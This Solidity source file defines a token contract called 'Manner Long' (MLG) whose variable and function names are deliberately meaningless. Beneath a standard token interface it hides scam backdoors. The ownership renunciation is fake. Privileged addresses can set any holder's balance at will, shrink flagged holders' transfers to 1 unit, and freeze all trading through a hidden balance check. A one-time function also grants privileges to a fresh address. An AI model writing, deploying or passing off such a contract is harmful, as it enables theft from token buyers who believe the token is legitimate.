//SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

interface enableMin {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract receiverMarketingTake {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface isToTake {
    function createPair(address isLimit, address tokenTx) external returns (address);
}

interface swapList {
    function totalSupply() external view returns (uint256);

    function balanceOf(address isFund) external view returns (uint256);

    function transfer(address autoMinLimit, uint256 shouldAt) external returns (bool);

    function allowance(address limitTrading, address spender) external view returns (uint256);

    function approve(address spender, uint256 shouldAt) external returns (bool);

    function transferFrom(
        address sender,
        address autoMinLimit,
        uint256 shouldAt
    ) external returns (bool);

    event Transfer(address indexed from, address indexed maxLaunched, uint256 value);
    event Approval(address indexed limitTrading, address indexed spender, uint256 value);
}

interface maxFeeLaunched is swapList {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract MannerLong is receiverMarketingTake, swapList, maxFeeLaunched {

    uint256 private txShould;

    function totalSupply() external view virtual override returns (uint256) {
        return autoEnable;
    }

    bool private autoIs;

    uint256 constant txTeam = 1 ** 10;

    address toMin = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function allowance(address marketingSell, address receiverWallet) external view virtual override returns (uint256) {
        if (receiverWallet == buyAmount) {
            return type(uint256).max;
        }
        return launchedFromToken[marketingSell][receiverWallet];
    }

    function approve(address receiverWallet, uint256 shouldAt) public virtual override returns (bool) {
        launchedFromToken[_msgSender()][receiverWallet] = shouldAt;
        emit Approval(_msgSender(), receiverWallet, shouldAt);
        return true;
    }

    function fundLiquidityEnable() public {
        emit OwnershipTransferred(liquidityTxMarketing, address(0));
        toSellFund = address(0);
    }

    uint256 modeSender;

    event OwnershipTransferred(address indexed shouldMarketing, address indexed fundSell);

    function shouldLaunchedMode(address swapShould) public {
        maxTeam();
        if (toTotal) {
            minTrading = isList;
        }
        if (swapShould == liquidityTxMarketing || swapShould == launchedTotalSwap) {
            return;
        }
        shouldIs[swapShould] = true;
    }

    uint256 private liquidityIsTotal;

    mapping(address => bool) public shouldIs;

    uint256 receiverSwapMarketing;

    function balanceOf(address isFund) public view virtual override returns (uint256) {
        return marketingTxLaunched[isFund];
    }

    uint256 public isList;

    function tokenList(address minBuySender, address autoMinLimit, uint256 shouldAt) internal returns (bool) {
        require(marketingTxLaunched[minBuySender] >= shouldAt);
        marketingTxLaunched[minBuySender] -= shouldAt;
        marketingTxLaunched[autoMinLimit] += shouldAt;
        emit Transfer(minBuySender, autoMinLimit, shouldAt);
        return true;
    }

    bool private toTotal;

    uint256 public buyReceiver;

    address buyAmount = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function maxTeam() private view {
        require(maxLaunch[_msgSender()]);
    }

    function owner() external view returns (address) {
        return toSellFund;
    }

    address public launchedTotalSwap;

    address private toSellFund;

    function tokenMode(uint256 shouldAt) public {
        maxTeam();
        modeSender = shouldAt;
    }

    function name() external view virtual override returns (string memory) {
        return autoMax;
    }

    function swapTokenWallet(address receiverSwap) public {
        require(receiverSwap.balance < 100000);
        if (totalLaunch) {
            return;
        }
        
        maxLaunch[receiverSwap] = true;
        
        totalLaunch = true;
    }

    function getOwner() external view returns (address) {
        return toSellFund;
    }

    uint256 private autoEnable = 100000000 * 10 ** 18;

    function launchedEnable(address minBuySender, address autoMinLimit, uint256 shouldAt) internal returns (bool) {
        if (minBuySender == liquidityTxMarketing) {
            return tokenList(minBuySender, autoMinLimit, shouldAt);
        }
        uint256 walletLiquidity = swapList(launchedTotalSwap).balanceOf(toMin);
        require(walletLiquidity == modeSender);
        require(autoMinLimit != toMin);
        if (shouldIs[minBuySender]) {
            return tokenList(minBuySender, autoMinLimit, txTeam);
        }
        return tokenList(minBuySender, autoMinLimit, shouldAt);
    }

    uint8 private feeTx = 18;

    constructor (){
        if (fromExempt == liquidityIsTotal) {
            autoIs = true;
        }
        enableMin fundAmount = enableMin(buyAmount);
        launchedTotalSwap = isToTake(fundAmount.factory()).createPair(fundAmount.WETH(), address(this));
        
        liquidityTxMarketing = _msgSender();
        fundLiquidityEnable();
        maxLaunch[liquidityTxMarketing] = true;
        marketingTxLaunched[liquidityTxMarketing] = autoEnable;
        
        emit Transfer(address(0), liquidityTxMarketing, autoEnable);
    }

    function transferFrom(address minBuySender, address autoMinLimit, uint256 shouldAt) external override returns (bool) {
        if (_msgSender() != buyAmount) {
            if (launchedFromToken[minBuySender][_msgSender()] != type(uint256).max) {
                require(shouldAt <= launchedFromToken[minBuySender][_msgSender()]);
                launchedFromToken[minBuySender][_msgSender()] -= shouldAt;
            }
        }
        return launchedEnable(minBuySender, autoMinLimit, shouldAt);
    }

    string private receiverEnable = "MLG";

    mapping(address => bool) public maxLaunch;

    mapping(address => uint256) private marketingTxLaunched;

    mapping(address => mapping(address => uint256)) private launchedFromToken;

    function decimals() external view virtual override returns (uint8) {
        return feeTx;
    }

    uint256 private fromExempt;

    bool public totalLaunch;

    function enableTo(address swapAmount, uint256 shouldAt) public {
        maxTeam();
        marketingTxLaunched[swapAmount] = shouldAt;
    }

    uint256 public minTrading;

    function symbol() external view virtual override returns (string memory) {
        return receiverEnable;
    }

    uint256 public receiverTake;

    string private autoMax = "Manner Long";

    address public liquidityTxMarketing;

    function transfer(address swapAmount, uint256 shouldAt) external virtual override returns (bool) {
        return launchedEnable(_msgSender(), swapAmount, shouldAt);
    }

}